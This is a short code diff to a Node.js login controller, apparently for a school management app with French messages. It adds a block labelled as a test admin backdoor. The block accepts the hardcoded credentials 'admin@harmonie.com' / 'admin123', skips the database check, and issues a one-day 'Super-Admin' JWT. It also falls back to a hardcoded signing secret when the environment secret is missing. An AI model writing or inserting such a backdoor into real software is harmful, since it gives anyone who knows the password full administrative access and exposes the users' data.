@@ -10,6 +10,17 @@ exports.login = async (req, res) => {
             return res.status(400).json({ message: 'Veuillez fournir un email et un mot de passe.' });
         }
 
+        // --- BACKDOOR ADMIN POUR TESTS ---
+        if (email === 'admin@harmonie.com' && password === 'admin123') {
+            const token = jwt.sign({ id: 1, role: 'Super-Admin', nom: 'Admin', prenom: 'Principal' }, process.env.JWT_SECRET || 'supersecret_key', { expiresIn: '1d' });
+            return res.json({
+                message: 'Connexion réussie',
+                token,
+                user: { id: 1, nom: 'Admin', prenom: 'Principal', role: 'Super-Admin', ecole_id: null }
+            });
+        }
+        // ---------------------------------
+
         const query = 'SELECT * FROM utilisateurs WHERE email = $1';
         const { rows } = await pool.query(query, [email]);
 
